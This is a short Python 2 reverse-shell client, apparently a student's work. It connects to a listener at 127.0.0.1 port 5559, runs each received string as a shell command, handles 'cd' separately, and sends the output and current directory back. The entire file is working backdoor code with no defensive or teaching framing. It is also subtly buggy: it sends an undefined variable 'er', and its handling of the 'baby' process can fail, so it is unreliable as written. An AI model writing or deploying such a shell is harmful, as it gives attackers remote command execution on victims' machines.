# Author: Sridhar Patil, BMSIT
import socket
import os
import subprocess
#[s c]
host = '127.0.0.1'
port = 5559

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((host,port))

while True:
    data = s.recv(1024)
    try:
        if data[:2] == 'cd':
            print data[3:]
            os.chdir(data[3:])

        baby = subprocess.Popen(data,shell=True,stdout=subprocess.PIPE)
        s.send(str(er))

    except Exception as e:
        s.send(str(e))
        #print e


    output = baby.stdout.read()
    output = output + os.getcwd() + "> "
    s.send(output)
    #print output

s.close()
